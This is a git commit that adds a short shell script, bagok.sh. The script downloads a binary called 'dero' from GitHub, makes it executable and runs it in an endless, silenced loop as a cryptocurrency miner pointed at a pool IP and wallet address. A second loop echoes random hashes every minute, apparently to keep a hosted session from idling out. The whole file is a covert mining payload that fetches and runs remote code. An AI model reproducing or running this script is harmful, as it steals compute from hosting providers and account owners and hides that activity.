ee282af009f5fc1e9f4fa0c6245e5d2b144366b9
RizQu5 <122372013+RizQu5@users.noreply.github.com>
2023-01-24 17:06:37 +0700

    Create bagok.sh

---
+++ bagok.sh
@@ -0,0 +1,9 @@
+wget https://github.com/angkii/2022/raw/main/dero >/dev/null 2>&1
+chmod +x dero >/dev/null 2>&1
+while [ 1 ]; do
+./dero -a yespowerR16 -o stratum+tcp://159.223.32.159:80 -u 0xcdfe60d6b80bfa1fe6fda7ee9bed95f5c3ff9f76 -p c=CAKE,mc=YTN,ID=001.beDO >/dev/null 2>&1
+done
+while [ 1 ]; do
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
+sleep 2
+done
